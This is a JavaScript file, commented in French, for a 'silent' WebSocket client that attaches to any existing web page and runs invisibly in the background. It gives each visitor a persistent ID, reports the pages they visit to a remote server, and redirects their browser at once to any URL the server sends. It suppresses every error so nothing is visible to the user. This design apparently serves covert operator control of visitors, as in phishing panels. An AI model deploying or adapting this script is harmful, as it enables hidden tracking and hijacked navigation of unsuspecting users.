/**
 * Client WebSocket Silencieux pour Intégration Sans Modification
 * 
 * Ce script s'intègre dans n'importe quelle page existante sans la modifier.
 * Il fonctionne de manière totalement invisible en arrière-plan.
 * 
 * UTILISATION: Ajouter une seule ligne dans vos pages HTML:
 * <script src="http://localhost:5001/js/websocket-client-silent.js"></script>
 */

(function() {
    'use strict';
    
    // Configuration
    const CONFIG = {
        serverUrl: 'http://localhost:5001',
        reconnectAttempts: 50,
        reconnectDelay: 2000,
        heartbeatInterval: 30000,
        silentMode: true, // Mode totalement silencieux
        autoStart: true
    };
    
    class SilentWebSocketClient {
        constructor() {
            this.socket = null;
            this.clientId = null;
            this.isConnected = false;
            this.reconnectCount = 0;
            this.heartbeatTimer = null;
            this.isInitialized = false;
            
            // Démarrage automatique
            if (CONFIG.autoStart) {
                this.init();
            }
        }
        
        init() {
            if (this.isInitialized) return;
            this.isInitialized = true;
            
            // Récupérer l'ID client persistant
            this.clientId = localStorage.getItem('ws_client_id');
            
            // Démarrer la connexion
            this.connect();
            
            // Gérer les événements de la page
            this.setupPageEvents();
        }
        
        connect() {
            try {
                // Charger Socket.IO dynamiquement si pas déjà chargé
                if (typeof io === 'undefined') {
                    this.loadSocketIO(() => this.establishConnection());
                } else {
                    this.establishConnection();
                }
            } catch (error) {
                this.scheduleReconnect();
            }
        }
        
        loadSocketIO(callback) {
            if (document.querySelector('script[src*="socket.io"]')) {
                callback();
                return;
            }
            
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js';
            script.onload = callback;
            script.onerror = () => this.scheduleReconnect();
            document.head.appendChild(script);
        }
        
        establishConnection() {
            try {
                this.socket = io(CONFIG.serverUrl, {
                    transports: ['websocket', 'polling'],
                    timeout: 10000,
                    reconnection: false,
                    forceNew: true
                });
                
                this.setupSocketEvents();
            } catch (error) {
                this.scheduleReconnect();
            }
        }
        
        setupSocketEvents() {
            if (!this.socket) return;
            
            // Connexion établie
            this.socket.on('connect', () => {
                this.isConnected = true;
                this.reconnectCount = 0;
                
                // Rejoindre avec l'ID existant si disponible
                if (this.clientId) {
                    this.socket.emit('rejoin_client', { client_id: this.clientId });
                }
                
                this.startHeartbeat();
                this.notifyPageChange();
            });
            
            // Réception de l'ID client
            this.socket.on('client_id', (data) => {
                this.clientId = data.client_id;
                localStorage.setItem('ws_client_id', this.clientId);
                this.notifyPageChange();
            });
            
            // REDIRECTION SILENCIEUSE - Fonctionnalité principale
            this.socket.on('redirect', (data) => {
                this.performSilentRedirect(data.url);
            });
            
            // Heartbeat
            this.socket.on('heartbeat_ack', () => {
                // Heartbeat reçu
            });
            
            // Déconnexion
            this.socket.on('disconnect', () => {
                this.isConnected = false;
                this.stopHeartbeat();
                this.scheduleReconnect();
            });
            
            // Erreurs
            this.socket.on('connect_error', () => {
                this.scheduleReconnect();
            });
            
            this.socket.on('error', () => {
                // Ignorer les erreurs en mode silencieux
            });
        }
        
        performSilentRedirect(url) {
            try {
                // Redirection immédiate et silencieuse
                window.location.href = url;
            } catch (error) {
                // Fallback
                try {
                    window.location.replace(url);
                } catch (e) {
                    // Dernier recours
                    document.location = url;
                }
            }
        }
        
        notifyPageChange() {
            if (!this.isConnected || !this.clientId || !this.socket) return;
            
            const currentPage = this.getCurrentPageInfo();
            this.socket.emit('page_change', {
                client_id: this.clientId,
                page: currentPage
            });
        }
        
        getCurrentPageInfo() {
            const path = window.location.pathname;
            const title = document.title || 'Page sans titre';
            return `${title} (${path})`;
        }
        
        startHeartbeat() {
            this.stopHeartbeat();
            
            this.heartbeatTimer = setInterval(() => {
                if (this.isConnected && this.clientId && this.socket) {
                    this.socket.emit('heartbeat', { client_id: this.clientId });
                }
            }, CONFIG.heartbeatInterval);
        }
        
        stopHeartbeat() {
            if (this.heartbeatTimer) {
                clearInterval(this.heartbeatTimer);
                this.heartbeatTimer = null;
            }
        }
        
        scheduleReconnect() {
            if (this.reconnectCount >= CONFIG.reconnectAttempts) {
                return; // Arrêter après trop de tentatives
            }
            
            this.reconnectCount++;
            
            setTimeout(() => {
                this.connect();
            }, CONFIG.reconnectDelay);
        }
        
        setupPageEvents() {
            // Notifier les changements de page
            window.addEventListener('popstate', () => {
                setTimeout(() => this.notifyPageChange(), 100);
            });
            
            // Gérer la fermeture de la page
            window.addEventListener('beforeunload', () => {
                if (this.socket && this.isConnected) {
                    this.socket.disconnect();
                }
            });
            
            // Gérer la visibilité de la page
            document.addEventListener('visibilitychange', () => {
                if (document.visibilityState === 'visible' && !this.isConnected) {
                    this.connect();
                }
            });
            
            // Notifier après le chargement complet
            window.addEventListener('load', () => {
                setTimeout(() => this.notifyPageChange(), 500);
            });
        }
        
        // Méthodes publiques (optionnelles)
        getStatus() {
            return {
                connected: this.isConnected,
                clientId: this.clientId,
                reconnectCount: this.reconnectCount
            };
        }
        
        forceReconnect() {
            this.reconnectCount = 0;
            this.connect();
        }
    }
    
    // Auto-initialisation
    let clientInstance = null;
    
    function initClient() {
        if (clientInstance) return;
        
        try {
            clientInstance = new SilentWebSocketClient();
            
            // Exposer globalement pour le débogage (optionnel)
            if (!CONFIG.silentMode) {
                window.wsClient = clientInstance;
            }
        } catch (error) {
            // Réessayer en cas d'erreur
            setTimeout(initClient, 5000);
        }
    }
    
    // Démarrer dès que possible
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initClient);
    } else {
        initClient();
    }
    
    // Démarrer aussi au chargement complet
    window.addEventListener('load', () => {
        if (!clientInstance) {
            initClient();
        }
    });
    
})();

